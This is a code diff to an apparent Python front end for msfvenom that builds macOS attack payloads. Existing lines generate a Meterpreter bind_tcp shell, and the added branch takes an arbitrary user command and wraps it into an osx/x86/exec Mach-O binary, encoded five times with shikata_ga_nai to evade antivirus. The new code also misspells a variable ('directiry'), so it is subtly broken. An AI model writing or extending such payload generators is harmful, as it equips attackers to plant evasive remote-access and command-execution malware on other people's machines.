@@ -194,6 +194,17 @@ def mac(namder):
         subprocess.check_output(
             f'msfvenom -p osx/x64/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f macho > {directory}{name}.macho')
     
+    elif namder == 3:
+        cmd = str(input('cmd: '))
+        directory = str(input('dir save: '))
+        b = list(directory)
+        if b[-1] != '/':
+            directory += '/'
+        name = str(input('name_file: '))
+
+        subprocess.check_output(
+            f'msfvenom -p osx/x86/exec CMD="{cmd}" -e x86/shikata_ga_nai -i 5 -f macho > {directiry}{name}.macho', shell=True)
+    
     else:
         a = 0
     
